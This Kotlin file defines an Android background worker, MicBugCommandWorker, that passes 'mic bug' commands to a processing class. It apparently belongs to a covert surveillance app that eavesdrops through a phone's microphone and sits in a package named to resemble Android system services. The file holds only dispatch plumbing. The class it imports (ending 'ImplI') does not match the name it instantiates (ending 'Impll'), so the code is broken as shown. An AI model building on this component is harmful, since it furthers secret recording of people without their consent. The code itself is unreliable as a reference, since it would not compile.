package com.android.services.workers.micbug

import android.content.Context
import androidx.hilt.work.HiltWorker
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.android.services.di.module.ApplicationScope
import com.android.services.interfaces.IBackgroundProcessing
import com.android.services.interfaces.IWorkerProcessing
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.services.micBug.MicBugCommandProcessingBaseImplI
import com.android.services.workers.base.BaseWorker
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import javax.inject.Inject

@HiltWorker
class MicBugCommandWorker @AssistedInject constructor(
    @Assisted val context: Context,
    @Assisted parameters: WorkerParameters,
    val localDatabaseSource: LocalDatabaseSource,
    @ApplicationScope val coroutineScope: CoroutineScope
) :
    BaseWorker(context, parameters, "MicBugWorker") {
    lateinit var micBugProcessingI: IWorkerProcessing
    override fun onCreate() {
        micBugProcessingI =
            MicBugCommandProcessingBaseImpll(context, localDatabaseSource, coroutineScope)
        micBugProcessingI.onCreate()
    }

    override fun onStartCommand() {
        micBugProcessingI.onStartCommand(inputData)
    }

    override fun onStop() {
        micBugProcessingI.onDestroy()
    }

    companion object {
        const val MIC_BUG_WORKER_TAG = "MIC_BUG_WORKER_TAG"
    }
}